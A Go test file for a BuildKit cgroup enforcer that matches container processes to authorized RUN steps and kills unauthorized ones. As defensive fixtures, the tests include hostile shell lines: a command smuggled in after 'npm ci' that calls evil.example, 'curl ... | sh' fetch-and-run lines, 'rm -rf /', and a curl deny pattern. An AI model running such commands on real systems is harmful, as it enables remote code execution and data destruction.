package enforcer

import (
	"bytes"
	"context"
	"errors"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	controlapi "github.com/moby/buildkit/api/services/control"
	"google.golang.org/grpc"
	"google.golang.org/grpc/metadata"
)

// ---------------- argv matching ----------------

func TestExtractRunCommand_StripsRunFlags(t *testing.T) {
	t.Parallel()

	cases := map[string]string{
		"[s 1/2] RUN --mount=type=cache,target=/root/.npm npm ci":    "npm ci",
		"[s 1/2] RUN --network=none --mount=type=secret,id=x echo a": "echo a",
		"[s 1/2] RUN --network=none":                                 "",
	}
	for in, want := range cases {
		if got := extractRunCommand(in); got != want {
			t.Errorf("extractRunCommand(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestArgvMatchesRun_ExactNotSubstring(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		argv []string
		cmd  string
		want bool
	}{
		{"shell form", []string{"/bin/sh", "-c", "npm ci"}, "npm ci", true},
		{"shell opts", []string{"/bin/bash", "-o", "pipefail", "-c", "npm ci"}, "npm ci", true},
		{"whitespace normalised", []string{"sh", "-c", "npm   ci\n"}, "npm ci", true},
		{"superstring is not a match", []string{"sh", "-c", "npm ci; curl http://x"}, "npm ci", false},
		{"prefix is not a match", []string{"sh", "-c", "npm"}, "npm ci", false},
		{"embedded in other argv", []string{"curl", "http://x", "npm ci"}, "npm ci", false},
		{"exec form", []string{"npm", "ci"}, "npm ci", true},
		{"empty", nil, "npm ci", false},
	}
	for _, tc := range cases {
		if got := argvMatchesRun(tc.argv, tc.cmd); got != tc.want {
			t.Errorf("%s: argvMatchesRun(%v, %q) = %v, want %v", tc.name, tc.argv, tc.cmd, got, tc.want)
		}
	}
}

// ---------------- registry ----------------

func TestSessionRegistry_PlaceholderUnauthorizedUntilRegistered(t *testing.T) {
	t.Parallel()

	r := NewSessionRegistry(time.Minute)
	r.SetCIRequirement(true, []string{FrontendAttrKeyProjectPath})

	r.UpsertVertex("rA", VertexState{Digest: "d", Name: "RUN x", StartedAt: time.Unix(1, 0)})

	pv := r.PendingVertices()
	if len(pv) != 1 || pv[0].Authorized || !pv[0].Placeholder {
		t.Fatalf("placeholder = %+v, want unauthorized placeholder", pv)
	}

	r.RegisterSession("rA", time.Unix(2, 0), map[string]string{FrontendAttrKeyProjectPath: "g/p"})

	pv = r.PendingVertices()
	if len(pv) != 1 || !pv[0].Authorized || pv[0].Placeholder {
		t.Fatalf("after register = %+v, want authorized, filled-in session", pv)
	}

	if pv[0].FrontendAttrs[FrontendAttrKeyProjectPath] != "g/p" {
		t.Fatalf("attrs not filled in: %+v", pv[0].FrontendAttrs)
	}
}

func TestSessionRegistry_SweepAgesOutUncompleted(t *testing.T) {
	t.Parallel()

	r := NewSessionRegistry(time.Minute)
	r.SetMaxSessionAge(time.Hour)
	r.RegisterSession("old", time.Unix(1, 0), nil)
	r.RegisterSession("new", time.Unix(1, 0), nil)

	r.mu.Lock()
	r.sessions["old"].lastActivity = time.Now().Add(-2 * time.Hour)
	r.mu.Unlock()

	if n := r.Sweep(time.Now()); n != 1 {
		t.Fatalf("Sweep dropped %d, want 1", n)
	}

	snap := r.Snapshot()
	if _, ok := snap["old"]; ok {
		t.Error("aged-out session still present")
	}

	if _, ok := snap["new"]; !ok {
		t.Error("fresh session was swept")
	}
}

func TestSessionRegistry_CloseSessionsNotIn(t *testing.T) {
	t.Parallel()

	r := NewSessionRegistry(time.Minute)
	r.RegisterSession("kept", time.Unix(1, 0), nil)
	r.RegisterSession("gone", time.Unix(1, 0), nil)
	time.Sleep(5 * time.Millisecond)

	cutoff := time.Now()

	time.Sleep(5 * time.Millisecond)
	r.RegisterSession("racing", time.Unix(1, 0), nil) // registered after cutoff: spared

	n := r.CloseSessionsNotIn(map[string]struct{}{"kept": {}}, cutoff)
	if n != 1 {
		t.Fatalf("closed %d, want 1", n)
	}

	snap := r.Snapshot()
	if !snap["gone"].Completed || snap["kept"].Completed || snap["racing"].Completed {
		t.Fatalf("unexpected completion state: %+v", snap)
	}
}

func TestSessionRegistry_LookupVerifiesCgroupInode(t *testing.T) {
	t.Parallel()

	r := NewSessionRegistry(time.Minute)

	var (
		mu    sync.Mutex
		inode = uint64(100)
		stErr error
	)

	r.SetStatFn(func(string) (uint64, error) {
		mu.Lock()
		defer mu.Unlock()

		return inode, stErr
	})
	r.LinkCgroup(100, CgroupBinding{SessionRef: "s", CgroupPath: "/cg/a"})

	if _, ok := r.LookupByCgroupID(100); !ok {
		t.Fatal("matching inode should resolve")
	}

	// Path now names a different cgroup: id was reused, binding is stale.
	mu.Lock()
	inode = 200
	mu.Unlock()

	if _, ok := r.LookupByCgroupID(100); ok {
		t.Fatal("stale binding (inode reused) must not resolve")
	}

	if _, ok := r.CgroupSnapshot()[100]; ok {
		t.Fatal("stale binding should have been deleted")
	}

	// Bindings with no recorded path are trusted (legacy callers).
	r.LinkCgroup(7, CgroupBinding{SessionRef: "s2"})

	if _, ok := r.LookupByCgroupID(7); !ok {
		t.Fatal("pathless binding should resolve")
	}

	// Removed cgroup dir.
	r.LinkCgroup(300, CgroupBinding{SessionRef: "s3", CgroupPath: "/cg/gone"})

	mu.Lock()
	inode, stErr = 300, os.ErrNotExist
	mu.Unlock()

	if _, ok := r.LookupByCgroupID(300); ok {
		t.Fatal("binding for removed cgroup must not resolve")
	}
}

// ---------------- joiner policy ----------------

type joinHarness struct {
	reg      *SessionRegistry
	source   *fakeEventSource
	root     string
	logs     *syncBuffer
	cancel   context.CancelFunc
	done     chan struct{}
	killFile string
}

func newJoinHarness(t *testing.T, reg *SessionRegistry, deferred time.Duration) *joinHarness {
	t.Helper()

	h := &joinHarness{reg: reg, source: newFakeEventSource(), root: t.TempDir(), logs: &syncBuffer{}, done: make(chan struct{})}

	logger := slog.New(slog.NewTextHandler(h.logs, &slog.HandlerOptions{Level: slog.LevelDebug}))

	j := NewCgroupJoiner(reg, h.source, logger,
		WithProcRoot(filepath.Join(h.root, "proc")),
		WithStatFn(func(string) (uint64, error) { return 4321, nil }),
		WithDeferredMatch(deferred, 10*time.Millisecond),
	)

	ctx, cancel := context.WithCancel(context.Background())
	h.cancel = cancel

	go func() {
		_ = j.Run(ctx)

		close(h.done)
	}()

	t.Cleanup(func() {
		cancel()
		<-h.done
	})

	return h
}

type syncBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *syncBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	return b.buf.Write(p)
}

func (b *syncBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()

	return b.buf.String()
}

func (h *joinHarness) stage(t *testing.T, name string, pid int, cmdline string) string {
	t.Helper()

	p := stageCgroup(t, h.root, name, pid, cmdline)
	h.killFile = filepath.Join(p, "cgroup.kill")

	if err := os.WriteFile(h.killFile, nil, 0o600); err != nil {
		t.Fatalf("stage cgroup.kill: %v", err)
	}

	return p
}

func (h *joinHarness) killed() bool {
	data, err := os.ReadFile(h.killFile)

	return err == nil && string(data) == "1"
}

func TestCgroupJoiner_AmbiguousKillsWhenAnyCandidateUnauthorized(t *testing.T) {
	reg := NewSessionRegistry(time.Minute)
	reg.SetCIRequirement(true, []string{FrontendAttrKeyProjectPath})

	reg.RegisterSession("rGood", time.Unix(1, 0), map[string]string{FrontendAttrKeyProjectPath: "g/p"})
	reg.UpsertVertex("rGood", VertexState{Digest: "dG", Name: "[s 1/1] RUN make", StartedAt: time.Unix(2, 0)})
	reg.RegisterSession("rBad", time.Unix(1, 0), map[string]string{"build-arg:OTHER": "x"})
	reg.UpsertVertex("rBad", VertexState{Digest: "dB", Name: "[s 1/1] RUN make", StartedAt: time.Unix(2, 0)})

	h := newJoinHarness(t, reg, 0)
	cg := h.stage(t, "ctr-amb", 11, "/bin/sh\x00-c\x00make\x00")
	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-amb", CgroupPath: cg}

	waitFor(t, time.Second, h.killed)

	if _, ok := reg.LookupByCgroupID(4321); ok {
		t.Fatal("killed cgroup must not be bound")
	}
}

func authedSession(reg *SessionRegistry, ref, vertex string) {
	reg.RegisterSession(ref, time.Unix(1, 0), map[string]string{FrontendAttrKeyProjectPath: "g/p"})
	reg.UpsertVertex(ref, VertexState{Digest: "d-" + ref, Name: vertex, StartedAt: time.Unix(2, 0)})
}

func TestCgroupJoiner_NoMatchUnderPolicy(t *testing.T) {
	const frontend = "/bin/sh\x00-c\x00/run/frontend-entrypoint\x00"

	policy := func() *SessionRegistry {
		reg := NewSessionRegistry(time.Minute)
		reg.SetCIRequirement(true, []string{FrontendAttrKeyProjectPath})

		return reg
	}

	t.Run("frontend container, all sessions authorized: not killed, bound ambiguous", func(t *testing.T) {
		reg := policy()
		authedSession(reg, "rA", "[s 1/1] RUN make")

		h := newJoinHarness(t, reg, 60*time.Millisecond)
		cg := h.stage(t, "ctr-fe", 21, frontend)
		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}

		waitFor(t, 2*time.Second, func() bool {
			b, ok := reg.LookupByCgroupID(4321)

			return ok && b.Ambiguous && len(b.AmbiguousCandidates) == 1
		})

		if h.killed() {
			t.Fatal("frontend container killed although every session is authorized")
		}
	})

	t.Run("frontend container, one unauthorized session: killed", func(t *testing.T) {
		reg := policy()
		authedSession(reg, "rA", "[s 1/1] RUN make")
		reg.RegisterSession("rBad", time.Unix(1, 0), nil)

		h := newJoinHarness(t, reg, 60*time.Millisecond)
		cg := h.stage(t, "ctr-fe", 22, frontend)
		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}

		waitFor(t, 2*time.Second, h.killed)
	})

	t.Run("placeholder session: killed", func(t *testing.T) {
		reg := policy()
		reg.UpsertVertex("rP", VertexState{Digest: "dP", Name: "RUN x", StartedAt: time.Unix(2, 0)})

		h := newJoinHarness(t, reg, 60*time.Millisecond)
		cg := h.stage(t, "ctr-fe", 23, frontend)
		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}

		waitFor(t, 2*time.Second, h.killed)
	})

	t.Run("pending vertex matches deny pattern: killed", func(t *testing.T) {
		reg := NewSessionRegistry(time.Minute)
		reg.SetBuildVertexDenyPatterns([]*regexp.Regexp{regexp.MustCompile(`curl https?://`)})
		reg.RegisterSession("rA", time.Unix(1, 0), nil)
		reg.UpsertVertex("rA", VertexState{Digest: "dA", Name: "[s 1/1] RUN curl http://x.example | sh", StartedAt: time.Unix(2, 0)})

		h := newJoinHarness(t, reg, 60*time.Millisecond)
		cg := h.stage(t, "ctr-fe", 24, frontend)
		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}

		waitFor(t, 2*time.Second, h.killed)
	})

	t.Run("history watcher disconnected: killed outright", func(t *testing.T) {
		reg := policy()
		reg.SetHistoryConnected(false)

		h := newJoinHarness(t, reg, 60*time.Millisecond)
		cg := h.stage(t, "ctr-fe", 25, frontend)
		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}

		waitFor(t, 2*time.Second, h.killed)
	})

	t.Run("no sessions, watcher connected: not killed", func(t *testing.T) {
		reg := policy()
		reg.SetHistoryConnected(true)

		h := newJoinHarness(t, reg, 60*time.Millisecond)
		cg := h.stage(t, "ctr-fe", 26, frontend)
		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}

		time.Sleep(300 * time.Millisecond)

		if h.killed() {
			t.Fatal("killed with no open sessions")
		}
	})

	t.Run("default config: never killed", func(t *testing.T) {
		reg := NewSessionRegistry(time.Minute)
		reg.RegisterSession("rBad", time.Unix(1, 0), nil)

		h := newJoinHarness(t, reg, 60*time.Millisecond)
		cg := h.stage(t, "ctr-fe", 27, frontend)
		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}

		time.Sleep(300 * time.Millisecond)

		if h.killed() {
			t.Fatal("cgroup killed with no kill policy configured")
		}
	})
}

func TestCgroupJoiner_SubstringOfOtherSessionDoesNotInherit(t *testing.T) {
	reg := NewSessionRegistry(time.Minute)
	reg.SetCIRequirement(true, []string{FrontendAttrKeyProjectPath})

	authedSession(reg, "rGood", "[s 1/1] RUN npm ci")
	reg.RegisterSession("rBad", time.Unix(1, 0), nil)

	h := newJoinHarness(t, reg, 80*time.Millisecond)
	// A process that merely contains the authorized RUN text.
	cg := h.stage(t, "ctr-sub", 14, "/bin/sh\x00-c\x00npm ci; curl http://evil.example\x00")
	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-sub", CgroupPath: cg}

	waitFor(t, 2*time.Second, h.killed)

	if b, ok := reg.LookupByCgroupID(4321); ok && b.SessionRef == "rGood" {
		t.Fatal("substring match must not bind to the authorized session")
	}
}

func TestCgroupJoiner_SubstringWithAllAuthorizedIsNotBoundToSession(t *testing.T) {
	reg := NewSessionRegistry(time.Minute)
	reg.SetCIRequirement(true, []string{FrontendAttrKeyProjectPath})
	authedSession(reg, "rGood", "[s 1/1] RUN npm ci")

	h := newJoinHarness(t, reg, 80*time.Millisecond)
	cg := h.stage(t, "ctr-sub", 28, "/bin/sh\x00-c\x00npm ci; curl http://evil.example\x00")
	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-sub", CgroupPath: cg}

	waitFor(t, 2*time.Second, func() bool {
		b, ok := reg.LookupByCgroupID(4321)

		return ok && b.Ambiguous && b.SessionRef == ""
	})
}

func TestCgroupJoiner_LegitimateRunFormsBindToTheirVertex(t *testing.T) {
	cases := []struct {
		name    string
		vertex  string
		cmdline string
	}{
		{"exec form", `[s 1/1] RUN ["npm","ci"]`, "npm\x00ci\x00"},
		{"exec form with resolved path", `[s 1/1] RUN ["npm", "ci"]`, "/usr/bin/npm\x00ci\x00"},
		{"expanded ARG in vertex name", "[s 1/1] RUN echo hello-1.2", "/bin/sh\x00-c\x00echo hello-$VERSION\x00"},
		{"heredoc", "[s 1/1] RUN <<EOF\nset -e\nmake\nEOF", "/bin/sh\x00-c\x00set -e\nmake\n\x00"},
		{"exec-last-command optimisation", "[s 1/1] RUN pip install requests", "python3\x00/usr/local/bin/pip\x00install\x00requests\x00"},
	}

	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			reg := NewSessionRegistry(time.Minute)
			reg.SetCIRequirement(true, []string{FrontendAttrKeyProjectPath})
			authedSession(reg, "rA", tc.vertex)

			h := newJoinHarness(t, reg, 0)
			cg := h.stage(t, "ctr-form", 40+i, tc.cmdline)
			h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-form", CgroupPath: cg}

			waitFor(t, time.Second, func() bool {
				b, ok := reg.LookupByCgroupID(4321)

				return ok && !b.Ambiguous && b.SessionRef == "rA" && b.VertexDigest == "d-rA"
			})

			if h.killed() {
				t.Fatal("legitimate RUN form killed")
			}
		})
	}
}

func TestCgroupJoiner_RescanDoesNotRejudgeLinkedCgroup(t *testing.T) {
	reg := NewSessionRegistry(time.Minute)
	authedSession(reg, "rA", "[s 1/1] RUN make")

	h := newJoinHarness(t, reg, 0)
	cg := h.stage(t, "ctr-re", 31, "/bin/sh\x00-c\x00make\x00")
	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-re", CgroupPath: cg}

	waitFor(t, time.Second, func() bool { _, ok := reg.LookupByCgroupID(4321); return ok })

	first, _ := reg.LookupByCgroupID(4321)

	time.Sleep(5 * time.Millisecond)

	// Rescan re-reports it, now with a policy that would reject it.
	reg.SetBuildVertexDenyPatterns([]*regexp.Regexp{regexp.MustCompile(`RUN make`)})
	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-re", CgroupPath: cg}
	time.Sleep(150 * time.Millisecond)

	if h.killed() {
		t.Fatal("already-linked cgroup was re-judged on rescan")
	}

	again, _ := reg.LookupByCgroupID(4321)
	if !again.LinkedAt.Equal(first.LinkedAt) {
		t.Fatal("binding was rewritten on rescan")
	}
}

func TestCgroupJoiner_KillOfGoneCgroupNotLogged(t *testing.T) {
	t.Parallel()

	logs := &syncBuffer{}
	j := NewCgroupJoiner(NewSessionRegistry(time.Minute), newFakeEventSource(),
		slog.New(slog.NewTextHandler(logs, &slog.HandlerOptions{Level: slog.LevelInfo})))

	gone := filepath.Join(t.TempDir(), "removed-cgroup")

	if j.killCgroup(gone) {
		t.Fatal("killCgroup reported success for a cgroup that does not exist")
	}

	j.killMatched(1, CgroupCreateEvent{ContainerID: "c", CgroupPath: gone},
		PendingVertex{SessionRef: "s", VertexDigest: "d"}, "buildkit cgroup killed: test", 0)

	if logs.String() != "" {
		t.Fatalf("expected no Info/Warn output for a gone cgroup, got: %s", logs.String())
	}
}

func TestCgroupJoiner_PlaceholderWaitsForRegistration(t *testing.T) {
	reg := NewSessionRegistry(time.Minute)
	reg.SetCIRequirement(true, []string{FrontendAttrKeyProjectPath})

	// Status arrived before the history record: placeholder session.
	reg.UpsertVertex("rLate", VertexState{Digest: "dL", Name: "[s 1/1] RUN make", StartedAt: time.Unix(2, 0)})

	h := newJoinHarness(t, reg, time.Second)
	cg := h.stage(t, "ctr-late", 15, "/bin/sh\x00-c\x00make\x00")
	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-late", CgroupPath: cg}

	time.Sleep(100 * time.Millisecond)

	if h.killed() {
		t.Fatal("killed on placeholder defaults before the session registered")
	}

	reg.RegisterSession("rLate", time.Unix(1, 0), map[string]string{FrontendAttrKeyProjectPath: "g/p"})

	waitFor(t, 2*time.Second, func() bool {
		b, ok := reg.LookupByCgroupID(4321)

		return ok && b.SessionRef == "rLate" && b.CgroupPath == cg
	})

	if h.killed() {
		t.Fatal("authorized session was killed")
	}
}

func TestCgroupJoiner_KillLogOmitsVertexName(t *testing.T) {
	reg := NewSessionRegistry(time.Minute)
	reg.SetBuildVertexDenyPatterns([]*regexp.Regexp{regexp.MustCompile(`SECRET_TOKEN`)})
	reg.RegisterSession("rA", time.Unix(1, 0), nil)

	const name = "[s 1/1] RUN echo SECRET_TOKEN=hunter2"

	reg.UpsertVertex("rA", VertexState{Digest: "dA", Name: name, StartedAt: time.Unix(2, 0)})

	h := newJoinHarness(t, reg, 0)
	cg := h.stage(t, "ctr-log", 16, "/bin/sh\x00-c\x00echo SECRET_TOKEN=hunter2\x00")
	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-log", CgroupPath: cg}

	waitFor(t, time.Second, h.killed)

	if out := h.logs.String(); strings.Contains(out, "hunter2") || strings.Contains(out, "vertex_name=") {
		t.Fatalf("log leaked vertex name text: %s", out)
	}

	if !strings.Contains(h.logs.String(), "vertex_digest=dA") {
		t.Fatalf("log should carry the vertex digest: %s", h.logs.String())
	}
}

// ---------------- watcher reconnect ----------------

type fakeStream struct {
	grpc.ClientStream
	recv func() (*controlapi.BuildHistoryEvent, error)
}

func (s *fakeStream) Header() (metadata.MD, error) { return metadata.MD{}, nil }

func (s *fakeStream) Recv() (*controlapi.BuildHistoryEvent, error) { return s.recv() }

type fakeControl struct {
	controlapi.ControlClient
	listen func(ctx context.Context) (grpc.ServerStreamingClient[controlapi.BuildHistoryEvent], error)
}

func (f *fakeControl) ListenBuildHistory(ctx context.Context, _ *controlapi.BuildHistoryRequest, _ ...grpc.CallOption) (grpc.ServerStreamingClient[controlapi.BuildHistoryEvent], error) {
	return f.listen(ctx)
}

func (f *fakeControl) Status(_ context.Context, _ *controlapi.StatusRequest, _ ...grpc.CallOption) (grpc.ServerStreamingClient[controlapi.StatusResponse], error) {
	return nil, errors.New("not implemented")
}

func quietLogger() *slog.Logger { return slog.New(slog.NewTextHandler(io.Discard, nil)) }

func TestAttributionWatcher_BacksOffAfterListenError(t *testing.T) {
	t.Parallel()

	var calls atomic.Int32

	fc := &fakeControl{listen: func(context.Context) (grpc.ServerStreamingClient[controlapi.BuildHistoryEvent], error) {
		calls.Add(1)

		return nil, errors.New("unavailable")
	}}

	w := NewAttributionWatcher("tcp://unused", NewSessionRegistry(time.Minute), quietLogger(),
		WithBackoff(40*time.Millisecond, 40*time.Millisecond))
	w.newClient = func(context.Context) (controlapi.ControlClient, func(), error) { return fc, func() {}, nil }

	ctx, cancel := context.WithTimeout(context.Background(), 400*time.Millisecond)
	defer cancel()

	if err := w.Run(ctx); !errors.Is(err, context.DeadlineExceeded) {
		t.Fatalf("Run = %v, want deadline exceeded", err)
	}

	// 400ms / 40ms backoff = ~10 attempts; a tight loop would be thousands.
	if n := calls.Load(); n < 2 || n > 15 {
		t.Fatalf("listen attempts = %d, want a handful (backoff honoured)", n)
	}
}

func TestAttributionWatcher_ReconnectClosesUnreplayedSessions(t *testing.T) {
	t.Parallel()

	reg := NewSessionRegistry(time.Minute)
	reg.RegisterSession("finished-while-down", time.Unix(1, 0), nil)
	reg.RegisterSession("still-running", time.Unix(1, 0), nil)
	time.Sleep(5 * time.Millisecond)

	var once sync.Once

	fc := &fakeControl{listen: func(ctx context.Context) (grpc.ServerStreamingClient[controlapi.BuildHistoryEvent], error) {
		sent := false

		return &fakeStream{recv: func() (*controlapi.BuildHistoryEvent, error) {
			if !sent {
				sent = true

				return &controlapi.BuildHistoryEvent{
					Type:   controlapi.BuildHistoryEventType_STARTED,
					Record: &controlapi.BuildHistoryRecord{Ref: "still-running"},
				}, nil
			}

			once.Do(func() {})
			<-ctx.Done()

			return nil, ctx.Err()
		}}, nil
	}}

	w := NewAttributionWatcher("tcp://unused", reg, quietLogger(), WithReplayGrace(50*time.Millisecond))
	w.newClient = func(context.Context) (controlapi.ControlClient, func(), error) { return fc, func() {}, nil }

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})

	go func() {
		_ = w.Run(ctx)

		close(done)
	}()

	waitFor(t, 2*time.Second, func() bool { return reg.Snapshot()["finished-while-down"].Completed })

	if reg.Snapshot()["still-running"].Completed {
		t.Error("session present in the replay was closed")
	}

	cancel()
	<-done
}

func TestStreamWasHealthy(t *testing.T) {
	t.Parallel()

	if !streamWasHealthy(true, time.Millisecond, time.Minute) {
		t.Error("stream that delivered a message is healthy")
	}

	if !streamWasHealthy(false, 2*time.Minute, time.Minute) {
		t.Error("idle stream outliving maxBackoff is healthy")
	}

	if streamWasHealthy(false, time.Second, time.Minute) {
		t.Error("short silent stream is not healthy")
	}
}

func TestAttributionWatcher_NoReplayCloseWhenHeaderFails(t *testing.T) {
	t.Parallel()

	reg := NewSessionRegistry(time.Minute)
	reg.RegisterSession("s", time.Unix(1, 0), nil)
	time.Sleep(5 * time.Millisecond)

	fc := &fakeControl{listen: func(context.Context) (grpc.ServerStreamingClient[controlapi.BuildHistoryEvent], error) {
		return &failingHeaderStream{}, nil
	}}

	w := NewAttributionWatcher("tcp://unused", reg, quietLogger(),
		WithReplayGrace(20*time.Millisecond), WithBackoff(5*time.Millisecond, 5*time.Millisecond))
	w.newClient = func(context.Context) (controlapi.ControlClient, func(), error) { return fc, func() {}, nil }

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()

	_ = w.Run(ctx)

	if reg.Snapshot()["s"].Completed {
		t.Fatal("session closed from a connection that never became ready")
	}

	if !reg.HistoryDisconnected() {
		t.Fatal("registry should report the watcher as disconnected")
	}
}

type failingHeaderStream struct{ grpc.ClientStream }

func (*failingHeaderStream) Header() (metadata.MD, error) { return nil, errors.New("unavailable") }

func (*failingHeaderStream) Recv() (*controlapi.BuildHistoryEvent, error) {
	return nil, errors.New("unavailable")
}

func TestSessionRegistry_StartedReopensCompletedSession(t *testing.T) {
	t.Parallel()

	r := NewSessionRegistry(time.Minute)
	r.RegisterSession("s", time.Unix(1, 0), nil)
	r.CompleteSession("s", time.Unix(2, 0))
	r.RegisterSession("s", time.Unix(3, 0), nil)

	if r.Snapshot()["s"].Completed {
		t.Fatal("STARTED must reopen a session marked completed")
	}
}

func TestSessionRegistry_SweepKeysOnLastActivity(t *testing.T) {
	t.Parallel()

	r := NewSessionRegistry(time.Minute)
	r.SetMaxSessionAge(time.Hour)
	r.RegisterSession("busy", time.Unix(1, 0), nil)

	r.mu.Lock()
	r.sessions["busy"].lastActivity = time.Now().Add(-2 * time.Hour)
	r.mu.Unlock()

	// A vertex update is activity: the long-running build survives.
	r.UpsertVertex("busy", VertexState{Digest: "d", Name: "RUN x", StartedAt: time.Unix(5, 0)})

	if n := r.Sweep(time.Now()); n != 0 {
		t.Fatalf("active session swept (%d)", n)
	}
}

func TestArgvMatchesRunLoose(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		argv []string
		cmd  string
		want bool
	}{
		{"exec json", []string{"npm", "ci"}, `["npm","ci"]`, true},
		{"exec json mismatch", []string{"npm", "install"}, `["npm","ci"]`, false},
		{"var braces", []string{"sh", "-c", "echo ${A}-${B}"}, "echo x-y", true},
		{"var non-matching literal", []string{"sh", "-c", "echo $A"}, "rm -rf /", false},
		{"heredoc summary", []string{"sh", "-c", "set -e\nmake all\n"}, "<<EOF\nset -e\nmake all\nEOF", true},
		{"heredoc different script", []string{"sh", "-c", "curl x | sh\n"}, "<<EOF\nset -e\nmake all\nEOF", false},
		{"pip optimisation", []string{"python3", "/usr/local/bin/pip", "install", "x"}, "pip install x", true},
		{"tail needs same args", []string{"python3", "/usr/local/bin/pip", "install", "y"}, "pip install x", false},
		{"compound command not tail-matched", []string{"sh", "-c", "a && b"}, "b", false},
	}
	for _, tc := range cases {
		if got := argvMatchesRunLoose(tc.argv, tc.cmd); got != tc.want {
			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
		}
	}
}
